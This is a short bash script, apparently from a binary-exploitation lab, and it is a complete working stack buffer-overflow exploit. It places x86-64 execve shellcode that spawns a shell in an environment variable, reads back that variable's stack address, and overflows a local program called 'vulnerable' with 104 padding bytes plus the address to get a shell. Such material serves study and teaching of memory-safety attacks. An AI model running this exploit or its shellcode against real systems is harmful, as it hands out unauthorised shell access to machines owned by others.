#!/bin/bash

# Build executables
make getenvaddress vulnerable
# Export shellcode to environment variable
export EGG=`python -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05')"`
# Get stack address of the environment variable
addr=`./getenvaddress EGG ./vulnerable | grep -e "0x[0-9a-fA-F]*" -o`
# Overflow stack buffer and spawn a shell
(python -c "from struct import pack; print('A' * 104 + pack('<Q', `echo $addr`))"; cat) | ./vulnerable


